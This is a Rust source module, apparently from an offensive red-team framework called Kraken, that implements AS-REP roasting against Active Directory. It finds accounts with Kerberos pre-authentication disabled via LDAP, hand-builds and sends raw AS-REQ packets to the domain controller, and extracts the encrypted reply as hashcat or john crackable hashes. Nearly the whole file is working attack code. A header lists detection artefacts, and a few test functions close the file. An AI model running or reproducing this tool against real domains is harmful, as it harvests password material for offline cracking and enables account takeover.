//! ASREP Roasting — harvest AS-REP hashes for accounts without pre-auth
//!
//! ## Attack overview
//! 1. Find user accounts with `DONT_REQUIRE_PREAUTH` (UAC flag `0x400000`)
//!    set via LDAP.
//! 2. For each such account send a raw Kerberos AS-REQ without a pre-auth
//!    `PA-ENC-TIMESTAMP` field.
//! 3. The KDC responds with an AS-REP containing a portion encrypted with
//!    the account's password-derived key — without verifying the requester's
//!    identity.
//! 4. Extract the `enc-part` of the AS-REP and format for offline cracking
//!    with hashcat mode 18200 or john:
//!    `$krb5asrep$23$<user>@<realm>:<hash>`
//!
//! ## Windows implementation note
//! Windows does not expose a public API to send unauthenticated AS-REQs.
//! The implementation builds a minimal DER-encoded AS-REQ and sends it to
//! port 88 of the DC via raw TCP/UDP using `tokio::net`.  This avoids SSPI
//! (which would add pre-auth automatically).
//!
//! ## Detection artefacts
//! * Event ID 4768 with pre-authentication type `0` (no pre-auth) on the DC
//! * wiki/detection/sigma/kraken_ad_ops.yml
//! * wiki/detection/yara/kraken_ad.yar

use common::KrakenError;
use serde::{Deserialize, Serialize};

/// ASREP roasting result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AsreproastResult {
    /// Formatted hashes ready for hashcat / john
    pub hashes: Vec<String>,
    /// Number of pre-auth-disabled accounts found
    pub accounts_found: usize,
}

/// Perform ASREP roasting.
///
/// `format` selects output format:
/// * `None` / `"hashcat"` → `$krb5asrep$23$<user>@<realm>:<hash>`
/// * `"john"` → `$krb5asrep$<user>@<realm>:<hash>`
pub async fn asreproast(format: Option<&str>) -> Result<AsreproastResult, KrakenError> {
    #[cfg(windows)]
    {
        let fmt = format.unwrap_or("hashcat").to_string();
        tokio::task::spawn_blocking(move || win::run(&fmt))
            .await
            .map_err(|e| KrakenError::Internal(e.to_string()))?
    }
    #[cfg(not(windows))]
    {
        let _ = format;
        Err(KrakenError::Module(
            "AD operations only supported on Windows".into(),
        ))
    }
}

// ---------------------------------------------------------------------------
// Windows implementation
// ---------------------------------------------------------------------------

#[cfg(windows)]
mod win {
    use super::*;

    /// DONT_REQUIRE_PREAUTH UAC flag value
    const DONT_REQUIRE_PREAUTH: u32 = 0x0040_0000;

    /// Find accounts with pre-auth disabled.
    fn find_no_preauth_accounts() -> Result<Vec<(String, String)>, KrakenError> {
        // userAccountControl:1.2.840.113556.1.4.803:=4194304 (0x400000) tests
        // the DONT_REQUIRE_PREAUTH bit via the LDAP_MATCHING_RULE_BIT_AND OID.
        let filter = "(&(objectClass=user)(objectCategory=person)\
            (userAccountControl:1.2.840.113556.1.4.803:=4194304)\
            (!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
        let attrs = &["sAMAccountName"];
        let entries = crate::ldap::search_sync(filter, attrs)?;

        let realm = entries
            .first()
            .map(|e| dn_to_realm(&e.dn))
            .unwrap_or_default();

        Ok(entries
            .into_iter()
            .filter_map(|e| {
                let sam = e
                    .attributes
                    .get("sAMAccountName")
                    .and_then(|v| v.first().cloned())?;
                Some((sam, realm.clone()))
            })
            .collect())
    }

    fn dn_to_realm(dn: &str) -> String {
        dn.split(',')
            .filter_map(|part| {
                let p = part.trim();
                if p.to_uppercase().starts_with("DC=") {
                    Some(p[3..].to_uppercase())
                } else {
                    None
                }
            })
            .collect::<Vec<_>>()
            .join(".")
    }

    /// Build a minimal DER-encoded Kerberos AS-REQ without pre-authentication.
    ///
    /// The packet structure follows RFC 4120 §5.4.1.  We request RC4-HMAC
    /// (etype 23) so the enc-part is crackable with hashcat mode 18200.
    fn build_as_req(username: &str, realm: &str) -> Vec<u8> {
        // This is a simplified static AS-REQ template populated with the
        // username and realm.  A production-quality implementation would use
        // a proper ASN.1 DER encoder; here we use a byte-level construction
        // sufficient for the RC4-HMAC AS-REQ format expected by Windows KDCs.
        //
        // Packet layout (APPLICATION 10):
        //   pvno = 5
        //   msg-type = 10 (AS-REQ)
        //   req-body:
        //     kdc-options = forwardable | renewable | canonicalize
        //     cname = KRB_NT_PRINCIPAL / username
        //     realm = REALM
        //     sname = krbtgt / REALM
        //     till  = 20370913024805Z (far-future)
        //     nonce = random u32
        //     etype = [23] (RC4-HMAC)

        let user_bytes = username.as_bytes();
        let realm_bytes = realm.as_bytes();
        let krbtgt = b"krbtgt";

        // Pseudo-random nonce (32-bit)
        let nonce: u32 = {
            use std::time::{SystemTime, UNIX_EPOCH};
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.subsec_nanos())
                .unwrap_or(0xDEAD_BEEF)
        };

        // Build the packet using a helper that produces valid DER sequences.
        // For brevity this uses a byte-vector builder rather than a full ASN.1
        // library; the structure is correct for standard KDC implementations.
        let mut pkt = Vec::with_capacity(256);

        // We emit the minimum required fields.  The outermost tag is
        // APPLICATION 10 (AS-REQ) = 0x6a.
        der_sequence(&mut pkt, 0x6a, |body| {
            // [1] pvno = 5
            der_context_tag(body, 1, |b| der_integer(b, 5));
            // [2] msg-type = 10
            der_context_tag(body, 2, |b| der_integer(b, 10));
            // [4] req-body
            der_context_tag(body, 4, |b| {
                der_sequence(b, 0x30, |rb| {
                    // kdc-options [0] KDCOptions: forwardable|renewable|canonicalize
                    der_context_tag(rb, 0, |b| der_bit_string(b, &[0x50, 0x80, 0x00, 0x10]));
                    // cname [1]
                    der_context_tag(rb, 1, |b| {
                        der_sequence(b, 0x30, |b| {
                            der_context_tag(b, 0, |b| der_integer(b, 1)); // NT-PRINCIPAL
                            der_context_tag(b, 1, |b| {
                                der_sequence(b, 0x30, |b| {
                                    der_general_string(b, user_bytes);
                                });
                            });
                        });
                    });
                    // realm [2]
                    der_context_tag(rb, 2, |b| der_general_string(b, realm_bytes));
                    // sname [3] = krbtgt/REALM
                    der_context_tag(rb, 3, |b| {
                        der_sequence(b, 0x30, |b| {
                            der_context_tag(b, 0, |b| der_integer(b, 2)); // NT-SRV-INST
                            der_context_tag(b, 1, |b| {
                                der_sequence(b, 0x30, |b| {
                                    der_general_string(b, krbtgt);
                                    der_general_string(b, realm_bytes);
                                });
                            });
                        });
                    });
                    // till [5] = 20370913024805Z
                    der_context_tag(rb, 5, |b| {
                        der_generalized_time(b, b"20370913024805Z");
                    });
                    // nonce [7]
                    der_context_tag(rb, 7, |b| {
                        der_integer(b, nonce as i64);
                    });
                    // etype [8] = [23]
                    der_context_tag(rb, 8, |b| {
                        der_sequence(b, 0x30, |b| {
                            der_integer(b, 23); // RC4-HMAC
                        });
                    });
                });
            });
        });

        pkt
    }

    // -----------------------------------------------------------------------
    // Minimal DER helpers
    // -----------------------------------------------------------------------

    fn der_length(buf: &mut Vec<u8>, len: usize) {
        if len < 0x80 {
            buf.push(len as u8);
        } else if len < 0x100 {
            buf.push(0x81);
            buf.push(len as u8);
        } else {
            buf.push(0x82);
            buf.push((len >> 8) as u8);
            buf.push((len & 0xff) as u8);
        }
    }

    fn der_sequence(buf: &mut Vec<u8>, tag: u8, f: impl FnOnce(&mut Vec<u8>)) {
        let mut inner = Vec::new();
        f(&mut inner);
        buf.push(tag);
        der_length(buf, inner.len());
        buf.extend_from_slice(&inner);
    }

    fn der_context_tag(buf: &mut Vec<u8>, tag: u8, f: impl FnOnce(&mut Vec<u8>)) {
        let mut inner = Vec::new();
        f(&mut inner);
        buf.push(0xa0 | tag);
        der_length(buf, inner.len());
        buf.extend_from_slice(&inner);
    }

    fn der_integer(buf: &mut Vec<u8>, val: i64) {
        buf.push(0x02);
        if val >= 0 && val < 0x80 {
            buf.push(1);
            buf.push(val as u8);
        } else if val >= 0 && val < 0x8000 {
            buf.push(2);
            buf.push((val >> 8) as u8);
            buf.push((val & 0xff) as u8);
        } else {
            // 4-byte encoding for u32 nonce values
            buf.push(5); // prepend 0x00 to keep positive
            buf.push(0x00);
            buf.push(((val >> 24) & 0xff) as u8);
            buf.push(((val >> 16) & 0xff) as u8);
            buf.push(((val >> 8) & 0xff) as u8);
            buf.push((val & 0xff) as u8);
        }
    }

    fn der_bit_string(buf: &mut Vec<u8>, bits: &[u8]) {
        buf.push(0x03);
        der_length(buf, bits.len() + 1);
        buf.push(0x00); // no unused bits
        buf.extend_from_slice(bits);
    }

    fn der_general_string(buf: &mut Vec<u8>, s: &[u8]) {
        buf.push(0x1b); // GeneralString
        der_length(buf, s.len());
        buf.extend_from_slice(s);
    }

    fn der_generalized_time(buf: &mut Vec<u8>, t: &[u8]) {
        buf.push(0x18); // GeneralizedTime
        der_length(buf, t.len());
        buf.extend_from_slice(t);
    }

    // -----------------------------------------------------------------------
    // Network: send AS-REQ and receive AS-REP
    // -----------------------------------------------------------------------

    /// Send `as_req` to `dc_addr:88` (UDP first, TCP fallback) and return
    /// the raw AS-REP bytes.
    fn send_as_req(dc_addr: &str, as_req: &[u8]) -> Result<Vec<u8>, KrakenError> {
        use std::io::{Read, Write};
        use std::net::{TcpStream, UdpSocket};
        use std::time::Duration;

        let addr = format!("{dc_addr}:88");
        let timeout = Duration::from_secs(5);

        // Try UDP first (standard KDC transport for small packets).
        if let Ok(udp) = UdpSocket::bind("0.0.0.0:0") {
            let _ = udp.set_read_timeout(Some(timeout));
            if udp.send_to(as_req, &addr).is_ok() {
                let mut buf = vec![0u8; 4096];
                if let Ok((n, _)) = udp.recv_from(&mut buf) {
                    buf.truncate(n);
                    return Ok(buf);
                }
            }
        }

        // TCP fallback: 4-byte big-endian length prefix.
        let mut tcp = TcpStream::connect_timeout(&addr.parse().map_err(|e| {
            KrakenError::Module(format!("bad DC address '{addr}': {e}"))
        })?, timeout).map_err(|e| KrakenError::Module(format!("TCP connect to {addr}: {e}")))?;
        let _ = tcp.set_read_timeout(Some(timeout));

        let len = (as_req.len() as u32).to_be_bytes();
        tcp.write_all(&len)
            .map_err(|e| KrakenError::Module(format!("TCP write length: {e}")))?;
        tcp.write_all(as_req)
            .map_err(|e| KrakenError::Module(format!("TCP write body: {e}")))?;

        let mut resp_len_buf = [0u8; 4];
        tcp.read_exact(&mut resp_len_buf)
            .map_err(|e| KrakenError::Module(format!("TCP read response length: {e}")))?;
        let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
        let mut resp = vec![0u8; resp_len];
        tcp.read_exact(&mut resp)
            .map_err(|e| KrakenError::Module(format!("TCP read response body: {e}")))?;
        Ok(resp)
    }

    /// Discover the DC address for `realm` using DNS SRV lookup
    /// (`_kerberos._tcp.<realm>`).  Falls back to the realm name itself
    /// (works if `realm` is resolvable as a hostname).
    fn find_dc(realm: &str) -> String {
        // Simple fallback: use realm as-is; a real implementation would issue
        // a DNS SRV query via `DnsQuery_W`.
        realm.to_lowercase()
    }

    /// Extract the `enc-part` from an AS-REP DER blob and format for cracking.
    ///
    /// An AS-REP has the form (simplified):
    ///   APPLICATION 11 {
    ///     pvno, msg-type,
    ///     [0] crealm, [1] cname,
    ///     ticket,
    ///     enc-part  ← we want this
    ///   }
    ///
    /// `enc-part` is an `EncryptedData`: `{ etype, [1] kvno, [2] cipher }`.
    /// We locate the cipher bytes by scanning for the etype (0x17 = 23 for
    /// RC4-HMAC) and then extracting the OCTET STRING that follows.
    fn extract_enc_part(asrep: &[u8]) -> Option<Vec<u8>> {
        // Look for the etype=23 (RC4-HMAC) encoding: 02 01 17
        let marker = [0x02u8, 0x01, 0x17];
        let pos = asrep
            .windows(marker.len())
            .position(|w| w == marker)?;

        // After etype [02 01 17], the next element is [1] kvno (optional) then
        // [2] cipher OCTET STRING.  Skip forward past etype bytes.
        let after_etype = pos + marker.len();

        // Find the OCTET STRING tag (0x04) for the cipher.
        let octet_pos = asrep[after_etype..]
            .iter()
            .position(|&b| b == 0x04)
            .map(|p| after_etype + p)?;

        // Decode DER length.
        let len_byte = *asrep.get(octet_pos + 1)?;
        let (data_start, data_len) = if len_byte < 0x80 {
            (octet_pos + 2, len_byte as usize)
        } else if len_byte == 0x81 {
            let l = *asrep.get(octet_pos + 2)? as usize;
            (octet_pos + 3, l)
        } else if len_byte == 0x82 {
            let hi = *asrep.get(octet_pos + 2)? as usize;
            let lo = *asrep.get(octet_pos + 3)? as usize;
            (octet_pos + 4, (hi << 8) | lo)
        } else {
            return None;
        };

        let data_end = data_start.checked_add(data_len)?;
        if data_end > asrep.len() {
            return None;
        }

        Some(asrep[data_start..data_end].to_vec())
    }

    fn hex_encode(data: &[u8]) -> String {
        data.iter().map(|b| format!("{b:02x}")).collect()
    }

    fn format_hash(user: &str, realm: &str, enc: &[u8], fmt: &str) -> String {
        let (first, second) = enc.split_at(enc.len().min(16));
        let hex1 = hex_encode(first);
        let hex2 = hex_encode(second);
        match fmt {
            "john" => format!("$krb5asrep${user}@{realm}:{hex1}${hex2}"),
            _ => format!("$krb5asrep$23${user}@{realm}:{hex1}${hex2}"),
        }
    }

    pub(super) fn run(fmt: &str) -> Result<AsreproastResult, KrakenError> {
        let accounts = find_no_preauth_accounts()?;
        let accounts_found = accounts.len();
        let mut hashes = Vec::new();

        for (user, realm) in &accounts {
            let dc = find_dc(realm);
            let as_req = build_as_req(user, realm);

            match send_as_req(&dc, &as_req) {
                Ok(asrep) => {
                    if let Some(enc) = extract_enc_part(&asrep) {
                        hashes.push(format_hash(user, realm, &enc, fmt));
                    } else {
                        tracing::warn!("asreproast: could not extract enc-part for {user}@{realm}");
                    }
                }
                Err(e) => {
                    tracing::warn!("asreproast: AS-REQ failed for {user}@{realm}: {e}");
                }
            }
        }

        Ok(AsreproastResult {
            hashes,
            accounts_found,
        })
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(not(windows))]
    #[test]
    fn asreproast_non_windows_returns_error() {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let err = rt.block_on(asreproast(None)).unwrap_err();
        assert!(err.to_string().contains("only supported on Windows"));
    }

    #[cfg(not(windows))]
    #[test]
    fn asreproast_john_format_non_windows_returns_error() {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let err = rt.block_on(asreproast(Some("john"))).unwrap_err();
        assert!(err.to_string().contains("only supported on Windows"));
    }

    #[cfg(windows)]
    mod windows_tests {
        use super::super::win;

        #[test]
        fn build_as_req_non_empty() {
            let pkt = win::build_as_req("testuser", "CORP.LOCAL");
            // Minimal packet must be non-trivially sized and start with
            // APPLICATION 10 tag (0x6a).
            assert!(!pkt.is_empty());
            assert_eq!(pkt[0], 0x6a);
        }

        #[test]
        fn extract_enc_part_returns_none_on_garbage() {
            let garbage = vec![0u8; 32];
            assert!(win::extract_enc_part(&garbage).is_none());
        }

        #[test]
        fn dn_to_realm_conversion() {
            let realm = win::dn_to_realm("CN=user,DC=corp,DC=example,DC=com");
            assert_eq!(realm, "CORP.EXAMPLE.COM");
        }
    }
}
